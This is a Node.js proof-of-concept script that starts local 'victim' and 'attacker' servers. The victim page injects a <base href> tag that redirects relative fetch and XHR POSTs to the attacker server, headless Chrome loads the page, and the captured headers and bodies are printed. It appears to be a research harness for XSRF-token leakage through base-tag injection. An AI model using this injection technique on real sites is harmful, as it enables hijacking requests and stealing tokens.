const http = require('http');
const {spawn} = require('child_process');

const victimPort = 8124;
const attackerPort = 8123;
const seen = [];

const attacker = http.createServer((req, res) => {
  const chunks = [];
  req.on('data', (c) => chunks.push(c));
  req.on('end', () => {
    seen.push({
      method: req.method,
      url: req.url,
      origin: req.headers.origin || '',
      acrh: req.headers['access-control-request-headers'] || '',
      xtest: req.headers['x-test'] || '',
      body: Buffer.concat(chunks).toString(),
    });
    res.setHeader('access-control-allow-origin', `http://127.0.0.1:${victimPort}`);
    res.setHeader('access-control-allow-methods', 'POST, OPTIONS');
    res.setHeader('access-control-allow-headers', 'x-test, x-xsrf-token');
    res.end('ok');
  });
});

const victim = http.createServer((req, res) => {
  res.setHeader('content-type', 'text/html');
  res.end(`<!doctype html>
    <base href="http://127.0.0.1:${attackerPort}/evil/">
    <script>
      fetch('api', {method:'POST', headers:{'X-Test':'fetch'}}).catch(() => {});
      fetch('/root-api', {method:'POST', headers:{'X-Test':'fetch-root'}}).catch(() => {});
      const x = new XMLHttpRequest();
      x.open('POST', 'xhr');
      x.setRequestHeader('X-Test', 'xhr');
      x.send('body');
      const y = new XMLHttpRequest();
      y.open('POST', '/root-xhr');
      y.setRequestHeader('X-Test', 'xhr-root');
      y.send('root-body');
    </script>`);
});

function listen(server, port) {
  return new Promise((resolve, reject) => {
    server.once('error', reject);
    server.listen(port, '127.0.0.1', resolve);
  });
}

(async () => {
  await listen(attacker, attackerPort);
  await listen(victim, victimPort);
  const chrome = spawn('/Applications/Google Chrome.app/Contents/MacOS/Google Chrome', [
    '--headless=new',
    '--disable-gpu',
    '--no-first-run',
    '--user-data-dir=/tmp/xsrf-base-chrome-profile',
    `http://127.0.0.1:${victimPort}/`,
  ], {stdio: 'ignore'});

  setTimeout(() => {
    chrome.kill('SIGTERM');
    attacker.close();
    victim.close();
    console.log(JSON.stringify(seen, null, 2));
  }, 3000);
})();

